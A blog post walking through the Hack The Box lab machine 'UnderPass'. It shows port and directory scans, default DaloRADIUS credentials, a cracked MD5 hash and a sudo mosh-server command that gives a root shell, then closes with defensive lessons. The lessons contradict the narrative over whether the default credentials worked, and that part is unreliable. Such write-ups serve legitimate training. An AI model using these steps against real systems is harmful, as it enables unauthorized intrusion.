---
title: UnderPass
published: 2025-01-20
description: A simple example of a Markdown blog post.
tags: [Markdown, Blogging]
category: Examples
licenseName: "Unlicensed"
author: emn178
sourceLink: "https://github.com/emn178/markdown"
draft: false
---

# Underpass

# Underpass - Machine Writeup


## Process

The penetration testing process for Underpass involved multiple phases, starting with reconnaissance and ending with privilege escalation to obtain root access.

### Reconnaissance

I began by performing an Nmap scan to identify open ports and running services on the target machine (10.10.11.48). The scan revealed two open ports:

```bash
┌──(easykp8㉿kps-kali)-[~/Downloads]
└─$ sudo nmap -Pn -T4 -n -sS -vv -A 10.10.11.48  
[sudo] password for easykp8: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-28 17:58 +06
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:58
Completed NSE at 17:58, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:58
Completed NSE at 17:58, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:58
Completed NSE at 17:58, 0.00s elapsed
Initiating SYN Stealth Scan at 17:58
Scanning 10.10.11.48 [1000 ports]
Discovered open port 22/tcp on 10.10.11.48
Discovered open port 80/tcp on 10.10.11.48
Completed SYN Stealth Scan at 17:58, 8.75s elapsed (1000 total ports)
Initiating Service scan at 17:58
Scanning 2 services on 10.10.11.48
Completed Service scan at 17:58, 6.82s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.10.11.48
Initiating Traceroute at 17:58
Completed Traceroute at 17:58, 0.51s elapsed
NSE: Script scanning 10.10.11.48.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:58
Completed NSE at 17:59, 19.21s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:59
Completed NSE at 17:59, 2.35s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:59
Completed NSE at 17:59, 0.00s elapsed
Nmap scan report for 10.10.11.48
Host is up, received user-set (0.48s latency).
Scanned at 2025-03-28 17:58:23 +06 for 43s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+kvbyNUglQLkP2Bp7QVhfp7EnRWMHVtM7xtxk34WU5s+lYksJ07/lmMpJN/bwey1SVpG0FAgL0C/+2r71XUEo=
|   256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ8XNCLFSIxMNibmm+q7mFtNDYzoGAJ/vDNa6MUjfU91
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.52 (Ubuntu)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=3/28%OT=22%CT=1%CU=39162%PV=Y%DS=2%DC=T%G=Y%TM=67E68F0
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST1
OS:1NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 12.130 days (since Sun Mar 16 14:52:18 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   505.43 ms 10.10.16.1
2   259.27 ms 10.10.11.48

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:59
Completed NSE at 17:59, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:59
Completed NSE at 17:59, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:59
Completed NSE at 17:59, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.09 seconds
           Raw packets sent: 1455 (64.878KB) | Rcvd: 1305 (54.617KB)
                                                                    
```

- Port 22: OpenSSH 8.9p1
- Port 80: Apache 2.4.52


SNMP-check: 


I found that there is `steve@underpass.htb`a user name and there is a `daloradius`service

I found a possible path in its Github`/var/www/daloradius`

### Web Application Discovery

Visiting the HTTP service on port 80 initially showed the default Apache page. To discover hidden directories, I used dirsearch and found a DaloRADIUS application installed at `/daloradius/`. Further enumeration revealed several subdirectories including:

```bash
┌──(easykp8㉿kps-kali)-[~]
└─$ dirsearch -u "http://10.10.11.48/daloradius/" -t 50 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50
Wordlist size: 11460

Output File: /home/easykp8/reports/http_10.10.11.48/_daloradius__25-03-31_11-10-23.txt

Target: http://10.10.11.48/

[11:10:23] Starting: daloradius/
[11:10:38] 200 -  221B  - /daloradius/.gitignore
[11:11:16] 301 -  319B  - /daloradius/app  ->  http://10.10.11.48/daloradius/app/
[11:11:25] 200 -   24KB - /daloradius/ChangeLog
[11:11:32] 301 -  319B  - /daloradius/doc  ->  http://10.10.11.48/daloradius/doc/
[11:11:32] 200 -    2KB - /daloradius/Dockerfile
[11:11:32] 200 -    2KB - /daloradius/docker-compose.yml
[11:11:48] 301 -  323B  - /daloradius/library  ->  http://10.10.11.48/daloradius/library/
[11:11:48] 200 -   18KB - /daloradius/LICENSE
[11:12:06] 200 -   10KB - /daloradius/README.md
[11:12:10] 301 -  321B  - /daloradius/setup  ->  http://10.10.11.48/daloradius/setup/

Task Completed

```

- `/daloradius/app/`

```bash
┌──(easykp8㉿kps-kali)-[~]
└─$ dirsearch -u "http://10.10.11.48/daloradius/app/" -t 50
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /home/easykp8/reports/http_10.10.11.48/_daloradius_app__25-03-31_11-14-48.txt

Target: http://10.10.11.48/

[11:14:48] Starting: daloradius/app/
[11:15:52] 301 -  326B  - /daloradius/app/common  ->  http://10.10.11.48/daloradius/app/common/
[11:16:51] 302 -    0B  - /daloradius/app/users/  ->  home-main.php
[11:16:51] 301 -  325B  - /daloradius/app/users  ->  http://10.10.11.48/daloradius/app/users/
[11:16:51] 200 -    2KB - /daloradius/app/users/login.php

Task Completed
                            
```

- `/daloradius/doc/`
- `/daloradius/library/`
- `/daloradius/setup/`

### Credential Discovery

Continuing my enumeration of the application structure, I found a login page at `/daloradius/app/users/login.php`. 


Through comprehensive directory scanning, I discovered the operator login portal at `/app/operators`. 


Documentation at `/daloradius/doc/install/INSTALL` revealed default credentials for the administrator interface.



I logged in to the backend using `/app/operators`the default password


This was the home page:


After accessing the DaloRADIUS admin panel, I discovered credentials for a user named `svcMosh` with the MD5 hash `412DD4759978ACFCC81DEAB01B382403`. 



Using Crackstation, I successfully cracked this hash and obtained the plaintext password.


### Initial Access

With the credentials for svcMosh, I established an SSH connection to the target machine and successfully acquired the user.txt flag.


### Privilege Escalation

Nothing valuable was found in the database, uploaded Linpeas, and found a command with special permissions



```bash
svcMosh@underpass:~$ cd /tmp
svcMosh@underpass:/tmp$ ls
systemd-private-2d92a1ac96f14df8a11a0364a7828fbf-apache2.service-EIrmMV       systemd-private-2d92a1ac96f14df8a11a0364a7828fbf-systemd-logind.service-UsIrqJ     systemd-private-2d92a1ac96f14df8a11a0364a7828fbf-upower.service-JckNW7
systemd-private-2d92a1ac96f14df8a11a0364a7828fbf-freeradius.service-OAEdEQ    systemd-private-2d92a1ac96f14df8a11a0364a7828fbf-systemd-resolved.service-CACYRz   vmware-root_789-4290756532
systemd-private-2d92a1ac96f14df8a11a0364a7828fbf-ModemManager.service-N54g1G  systemd-private-2d92a1ac96f14df8a11a0364a7828fbf-systemd-timesyncd.service-baErdl
svcMosh@underpass:/tmp$ mosh
Usage: /usr/bin/mosh [options] [--] [user@]host [command...]
        --client=PATH        mosh client on local machine
                                (default: "mosh-client")
        --server=COMMAND     mosh server on remote machine
                                (default: "mosh-server")

        --predict=adaptive      local echo for slower links [default]
-a      --predict=always        use local echo even on fast links
-n      --predict=never         never use local echo
        --predict=experimental  aggressively echo even when incorrect

-4      --family=inet        use IPv4 only
-6      --family=inet6       use IPv6 only
        --family=auto        autodetect network type for single-family hosts only
        --family=all         try all network types
        --family=prefer-inet use all network types, but try IPv4 first [default]
        --family=prefer-inet6 use all network types, but try IPv6 first
-p PORT[:PORT2]
        --port=PORT[:PORT2]  server-side UDP port or range
                                (No effect on server-side SSH port)
        --bind-server={ssh|any|IP}  ask the server to reply from an IP address
                                       (default: "ssh")

        --ssh=COMMAND        ssh command to run when setting up session
                                (example: "ssh -p 2222")
                                (default: "ssh")

        --no-ssh-pty         do not allocate a pseudo tty on ssh connection

        --no-init            do not send terminal initialization string

        --local              run mosh-server locally without using ssh

        --experimental-remote-ip=(local|remote|proxy)  select the method for
                             discovering the remote IP address to use for mosh
                             (default: "proxy")

        --help               this message
        --version            version and copyright information

Please report bugs to mosh-devel@mit.edu.
Mosh home page: https://mosh.org
svcMosh@underpass:/tmp$ 

```

Further investigation showed that Mosh uses a `--server` parameter that defaults to executing `mosh-server`. Since this command had elevated permissions, I was able to exploit it by specifying a custom server command:

```bash
svcMosh@underpass:/tmp$ mosh --server="sudo /usr/bin/mosh-server" localhost
```

Then I got the root shell:



Then got my root.txt



## Key Learnings

### 1. **Network Scanning and Enumeration**

- **Tool Used: Nmap**
    - The document starts with an Nmap scan (SYN Stealth Scan) to identify open ports on the target (10.10.11.48). Ports 22 (SSH) and 80 (HTTP) were found open.
    - **Learning**: Nmap is a powerful tool for discovering hosts, open ports, services, and operating system details. The SYN stealth scan (-sS) is stealthier as it doesn’t complete the TCP handshake, reducing the chance of detection.
    - Additional scans like service detection (-sV) and OS detection (-O) provided version information (e.g., OpenSSH 8.9p1, Apache 2.4.52) and OS details (Linux 5.X).
    - **Takeaway**: Always start with reconnaissance to gather as much information as possible about the target before attempting exploitation.
- **Traceroute and Network Insights**
    - The scan included a traceroute, showing the network distance (2 hops) to the target.
    - **Learning**: Understanding network topology can help identify where the target resides and potential intermediate devices (e.g., routers or firewalls).

### 2. **Web Enumeration**

- **Tool Used: dirsearch**
    - The attacker used dirsearch to enumerate directories on the web server running on port 80, discovering the /daloradius application and eventually the /daloradius/app/users/login.php page.
    - **Learning**: Web enumeration is critical when a web server is present. Tools like dirsearch or gobuster help uncover hidden directories and files that might expose vulnerabilities or sensitive information.
    - **Takeaway**: Default installations (like DaloRADIUS, a RADIUS server management tool) often leave behind documentation or default credentials that can be exploited.
- **Default Credentials**
    - The attacker found default credentials (administrator:radius) in the DaloRADIUS documentation under /daloradius/doc/install/INSTALL.
    - **Learning**: Many systems are left with default credentials, making them easy targets. Always check documentation or common credential lists during testing.
    - However, these credentials didn’t work, indicating they might have been changed or the approach needed adjustment.
    - **Takeaway**: Default credentials are a common entry point, but failure requires pivoting to other methods (e.g., more enumeration or brute-forcing).

### 3. **Credential Discovery and Hash Cracking**

- **User and Hash Found**
    - While exploring the website, the attacker discovered a user svcMosh with an MD5 hash: 412DD4759978ACFCC81DEAB01B382403.
    - Using CrackStation (an online hash-cracking tool), the hash was cracked to reveal the password (not explicitly shown in the document but implied to be successful).
    - **Learning**: Exposed hashes in web applications or databases are a common vulnerability. Tools like CrackStation, Hashcat, or John the Ripper can crack weak hashes like MD5.
    - **Takeaway**: Always secure sensitive data (e.g., use salted hashes like bcrypt) to prevent easy cracking.
- **SSH Login**
    - The cracked password allowed SSH access as svcMosh on port 22, granting initial foothold with the user flag: f08f728a2b572902c71f4b8933f7c60d.
    - **Learning**: SSH is a frequent target for exploitation once credentials are obtained. Weak passwords or reused credentials increase this risk.
    - **Takeaway**: Secure SSH with strong passwords, key-based authentication, or by restricting access (e.g., via firewalls).

### 4. **Privilege Escalation**

- **Tool Used: LinPEAS**
    - The attacker uploaded LinPEAS (a Linux privilege escalation enumeration script) and identified a command with "special permissions" (likely sudo privileges).
    - The command /usr/bin/mosh-server was found to be executable with sudo by the svcMosh user.
    - **Learning**: Tools like LinPEAS automate the process of finding privilege escalation vectors (e.g., SUID binaries, misconfigured permissions, or sudo rights).
    - **Takeaway**: Regularly audit user permissions and sudo configurations to prevent unintended privilege escalation.
- **Exploiting Mosh**
    - The attacker used the mosh command with the --server option to run sudo /usr/bin/mosh-server, effectively gaining a root shell.
    - Command: mosh --server="sudo /usr/bin/mosh-server" localhost.
    - **Learning**: Mosh (Mobile Shell) is a replacement for SSH that supports roaming and intermittent connectivity. If a user can run it with sudo, it can be exploited to execute commands as root.
    - The attacker connected to localhost, started mosh-server as root, and retrieved a root shell.
    - **Takeaway**: Misconfigured sudo privileges on commands like mosh-server can lead to full system compromise. Limit sudo to specific, safe commands and avoid granting it to powerful binaries.

### 5. **General Security Lessons**

- **Reconnaissance is Key**: The process began with thorough scanning (Nmap) and enumeration (dirsearch), highlighting the importance of gathering information before exploitation.
- **Default Configurations are Risky**: The presence of DaloRADIUS with accessible documentation and default credentials shows how default setups can be exploited.
- **Privilege Management**: The escalation via sudo mosh-server underscores the need for careful privilege assignment and regular auditing.
- **Persistence and Exploration**: The attacker didn’t stop at initial access but explored further (e.g., database, website) and used tools (LinPEAS) to escalate privileges.

## Reference

HYH. (2024, December 22). *HTB-UnderPass*. HYH Forever. [https://www.hyhforever.top/htb-underpass/](https://www.hyhforever.top/htb-underpass/)

Heater, B. (2024, December 24). *HackTheBox | UnderPass*. BenHeater.com. [https://benheater.com/hackthebox-underpass/](https://benheater.com/hackthebox-underpass/)